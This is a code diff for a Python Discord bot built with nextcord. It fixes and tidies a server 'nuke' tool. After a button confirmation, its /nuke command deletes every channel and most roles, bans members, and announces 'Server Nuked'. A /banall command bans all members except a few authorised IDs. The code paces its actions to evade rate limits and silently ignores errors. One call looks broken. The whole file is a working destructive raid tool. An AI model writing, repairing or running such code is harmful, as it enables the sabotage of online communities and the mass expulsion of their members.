@@ -4,7 +4,7 @@ import asyncio
 import nextcord
 from nextcord.ext import commands
 from nextcord import Interaction
-from nextcord.ui import View, Button
+from nextcord.ui import View
 from flask import Flask
 
 # ----------------------
@@ -50,7 +50,7 @@ async def on_ready():
         print("❌ Sync error:", e)
 
 # ----------------------
-# CONFIRM VIEW
+# CONFIRM NUKE VIEW (FIXED)
 # ----------------------
 class ConfirmNuke(View):
     def __init__(self, user_id):
@@ -59,23 +59,43 @@ class ConfirmNuke(View):
         self.confirmed = False
 
     async def interaction_check(self, interaction: Interaction):
-        return interaction.user.id == self.user_id
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message(
+                "❌ You cannot use these buttons.",
+                ephemeral=True
+            )
+            return False
+        return True
 
-    @Button(label="CONFIRM NUKE", style=nextcord.ButtonStyle.danger)
-    async def confirm(self, button: Button, interaction: Interaction):
+    @nextcord.ui.button(
+        label="CONFIRM NUKE",
+        style=nextcord.ButtonStyle.danger
+    )
+    async def confirm(
+        self,
+        button: nextcord.ui.Button,
+        interaction: Interaction
+    ):
         self.confirmed = True
-        for i in self.children:
-            i.disabled = True
+        for child in self.children:
+            child.disabled = True
         await interaction.response.edit_message(
             content="💥 **NUKE CONFIRMED — RUNNING...**",
             view=self
         )
         self.stop()
 
-    @Button(label="CANCEL", style=nextcord.ButtonStyle.secondary)
-    async def cancel(self, button: Button, interaction: Interaction):
-        for i in self.children:
-            i.disabled = True
+    @nextcord.ui.button(
+        label="CANCEL",
+        style=nextcord.ButtonStyle.secondary
+    )
+    async def cancel(
+        self,
+        button: nextcord.ui.Button,
+        interaction: Interaction
+    ):
+        for child in self.children:
+            child.disabled = True
         await interaction.response.edit_message(
             content="❌ Cancelled.",
             view=self
@@ -83,13 +103,16 @@ class ConfirmNuke(View):
         self.stop()
 
 # ----------------------
-# /NUKE
+# /NUKE COMMAND
 # ----------------------
-@bot.slash_command(description="Deletes channels, roles & bans members")
+@bot.slash_command(description="Deletes channels, roles and bans members")
 async def nuke(interaction: Interaction):
 
     if interaction.user.id not in AUTHORIZED_USERS:
-        await interaction.response.send_message("❌ Not allowed.", ephemeral=True)
+        await interaction.response.send_message(
+            "❌ Not allowed.",
+            ephemeral=True
+        )
         return
 
     view = ConfirmNuke(interaction.user.id)
@@ -103,7 +126,7 @@ async def nuke(interaction: Interaction):
     if not view.confirmed:
         return
 
-    # VERY IMPORTANT
+    # IMPORTANT: prevent timeout
     await interaction.followup.defer(ephemeral=True)
 
     guild = interaction.guild
@@ -112,7 +135,7 @@ async def nuke(interaction: Interaction):
     # DELETE CHANNELS
     for channel in list(guild.channels):
         try:
-            await channel.delete()
+            await channel.delete(reason="Nuked")
             await asyncio.sleep(0.4)
         except:
             pass
@@ -124,7 +147,7 @@ async def nuke(interaction: Interaction):
         if role.position >= bot_member.top_role.position:
             continue
         try:
-            await role.delete()
+            await role.delete(reason="Nuked")
             await asyncio.sleep(0.3)
         except:
             pass
@@ -145,25 +168,36 @@ async def nuke(interaction: Interaction):
 
     try:
         ch = await guild.create_text_channel("server-nuked")
-        await ch.send(f"💥 Nuked.\nBanned: {banned}\nFailed: {failed}")
+        await ch.send(
+            f"💥 **Server Nuked**\n"
+            f"🔨 Banned: {banned}\n"
+            f"⚠️ Failed: {failed}"
+        )
     except:
         pass
 
 # ----------------------
-# /BANALL (FIXED)
+# /BANALL COMMAND (FIXED)
 # ----------------------
 @bot.slash_command(description="Ban all members except authorized users")
 async def banall(interaction: Interaction):
 
     if interaction.user.id not in AUTHORIZED_USERS:
-        await interaction.response.send_message("❌ Not allowed.", ephemeral=True)
+        await interaction.response.send_message(
+            "❌ Not allowed.",
+            ephemeral=True
+        )
         return
 
     guild = interaction.guild
     if not guild:
-        await interaction.response.send_message("❌ Server only.", ephemeral=True)
+        await interaction.response.send_message(
+            "❌ Server only.",
+            ephemeral=True
+        )
         return
 
+    # Prevent timeout
     await interaction.response.defer(ephemeral=True)
 
     banned = 0
@@ -180,11 +214,13 @@ async def banall(interaction: Interaction):
             failed += 1
 
     await interaction.followup.send(
-        f"✅ Banall done\n🔨 Banned: {banned}\n⚠️ Failed: {failed}",
+        f"✅ **Banall Complete**\n"
+        f"🔨 Banned: {banned}\n"
+        f"⚠️ Failed: {failed}",
         ephemeral=True
     )
 
 # ----------------------
-# RUN
+# RUN BOT
 # ----------------------
 bot.run(TOKEN)
